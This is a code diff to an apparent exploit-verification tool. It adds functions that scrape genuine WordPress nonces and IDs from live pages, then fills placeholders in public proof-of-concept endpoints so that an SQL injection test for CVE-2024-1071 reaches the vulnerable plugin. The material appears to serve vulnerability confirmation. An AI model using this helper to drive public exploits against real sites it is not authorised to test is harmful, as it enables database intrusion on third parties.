@@ -124,6 +124,62 @@ def _pick_param(params, hints) -> Optional[str]:
     return None
 
 
+_NONCE_HTML_RE = re.compile(
+    r'(?:nonce|security)["\']?\s*[:=]\s*["\']([a-f0-9]{8,16})["\']', re.I)
+_WPNONCE_INPUT_RE = re.compile(
+    r'name=["\']_?wpnonce[^"\']*["\'][^>]*value=["\']([a-f0-9]{8,16})["\']', re.I)
+_WPNONCE_INPUT_RE2 = re.compile(
+    r'value=["\']([a-f0-9]{8,16})["\'][^>]*name=["\']_?wpnonce[^"\']*["\']', re.I)
+
+
+def _scrape_nonce_candidates(html: str) -> list:
+    """Busca nonces de WordPress REALES embebidos en una pagina viva (inline JS vía
+    wp_localize_script, p.ej. `"nonce":"abcd1234"`, o un campo oculto `_wpnonce`) -- un nonce de
+    WP es siempre hexadecimal de 8-16 caracteres, generado por sesion/accion, nunca adivinable."""
+    found = []
+    for rx in (_NONCE_HTML_RE, _WPNONCE_INPUT_RE, _WPNONCE_INPUT_RE2):
+        for m in rx.finditer(html or ""):
+            v = m.group(1)
+            if v not in found:
+                found.append(v)
+    return found
+
+
+def _resolve_endpoint_placeholders(endpoint: str, html_sources: list) -> tuple:
+    """Si `endpoint` trae un placeholder literal sin resolver tal cual vino de un PoC publico
+    (p.ej. '.../admin-ajax.php?action=x&nonce={nonce}&directory_id={dir_id}'), lo rellena con un
+    valor REAL raspado de una pagina viva del sitio (el nonce de WordPress embebido en el HTML/JS
+    de cualquier pagina que use el plugin atacado, o el primer ID numerico plausible del HTML)
+    en vez de mandar la llave literal '{nonce}' como si fuera el valor -- confirmado en vivo,
+    CVE-2024-1071: el exploit publico de gbrsh trae el endpoint como PLANTILLA, y sin esto
+    binoracle manda el string '{nonce}' tal cual, que el servidor rechaza siempre con
+    'Wrong Nonce' -- un bloqueo de infraestructura (placeholder sin resolver), no evidencia de
+    que la inyeccion SQL real no exista. Funciona para cualquier plugin/CVE, no solo este: no
+    depende de nada especifico de Ultimate Member."""
+    placeholders = re.findall(r"\{(\w+)\}", endpoint or "")
+    if not placeholders:
+        return endpoint, {}
+    all_html = "\n".join(h for h in html_sources if h)
+    nonces = _scrape_nonce_candidates(all_html)
+    ids_seen = []
+    for m in re.finditer(r'\b(\d{1,6})\b', all_html):
+        if m.group(1) not in ids_seen:
+            ids_seen.append(m.group(1))
+    resolved = {}
+    new_endpoint = endpoint
+    for ph in placeholders:
+        low = ph.lower()
+        val = None
+        if "nonce" in low or "token" in low or low in ("security",):
+            val = nonces[0] if nonces else None
+        elif any(h in low for h in ("id", "dir")):
+            val = ids_seen[0] if ids_seen else None
+        if val is not None:
+            resolved[ph] = val
+            new_endpoint = new_endpoint.replace("{" + ph + "}", val)
+    return new_endpoint, resolved
+
+
 def _redirect_location_is_external(location: str, evil_host: str) -> bool:
     """Confirma que una cabecera Location real redirige de verdad al host externo -- NUNCA un
     simple `evil_host in location` (substring), que da un falso positivo real y confirmado en
@@ -1836,6 +1892,29 @@ def verify_wordpress_sqli(
                  f"real creada con el shortcode ({boot.shortcode_page_path})...")
             endpoint = boot.shortcode_page_path
             res.evidence["endpoint_shortcode_page"] = endpoint
+
+        # si el endpoint trae placeholders sin resolver (p.ej. llego tal cual de un PoC publico
+        # con 'nonce={nonce}&directory_id={dir_id}'), raspa valores REALES de una pagina viva
+        # antes de atacar -- confirmado en vivo, CVE-2024-1071: sin esto se manda el string
+        # literal '{nonce}' y el servidor rechaza SIEMPRE con 'Wrong Nonce', un bloqueo de
+        # infraestructura que no dice nada sobre si la inyeccion SQL real existe.
+        if re.search(r"\{\w+\}", endpoint or ""):
+            html_sources = []
+            for probe_path in ("/", boot.shortcode_page_path or ""):
+                if not probe_path:
+                    continue
+                try:
+                    html_sources.append(boot.sub_sess.get(boot.base_url + probe_path,
+                                                          timeout=15).text or "")
+                except Exception:
+                    pass
+            new_endpoint, resolved = _resolve_endpoint_placeholders(endpoint, html_sources)
+            if resolved:
+                step(f"endpoint traia placeholder(s) sin resolver {list(resolved)} -- "
+                     f"rellenados con valores reales raspados de una pagina viva del sitio")
+                res.evidence["placeholders_resueltos"] = resolved
+            endpoint = new_endpoint
+            res.evidence["endpoint_tras_resolver_placeholders"] = endpoint
 
         m = (http_method or "GET").upper()
         base_params = dict(parameters) if isinstance(parameters, dict) else {p: "1" for p in (parameters or [])}
